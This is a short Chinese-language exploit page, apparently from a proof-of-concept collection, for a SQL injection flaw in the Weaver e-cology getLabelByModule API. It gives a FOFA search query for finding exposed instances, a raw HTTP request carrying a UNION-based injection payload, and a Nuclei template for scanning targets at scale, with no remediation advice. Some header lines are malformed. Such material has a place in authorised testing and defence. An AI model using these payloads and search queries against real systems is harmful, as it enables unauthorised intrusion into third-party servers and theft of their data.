## 泛微e-cology接口getLabelByModule存在sql注入漏洞



## fofa
```
app="泛微-E-Weaver"
```

## poc
```
GET /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa')+union+all+select+'1,1123123'+-- HTTP/1.1
Host: {}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=utf-8Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


## Nuclei
```
id: weaver-getLabelByModule-SQL
 
info:
  name: weaver-getLabelByModule-SQL
  author: HackTwo
  severity: high
 
  description: |
    漏洞测试-SQLTest
  reference:
    - https://127.0.0.1
  tags: auto
 
http:
  - raw:
      - |
        GET /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa')+union+all+select+'1,1123123'+-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        X-Requested-With: XMLHttpRequest
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9b
        Connection: close
 
 
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains(body_1,'1123123')
```
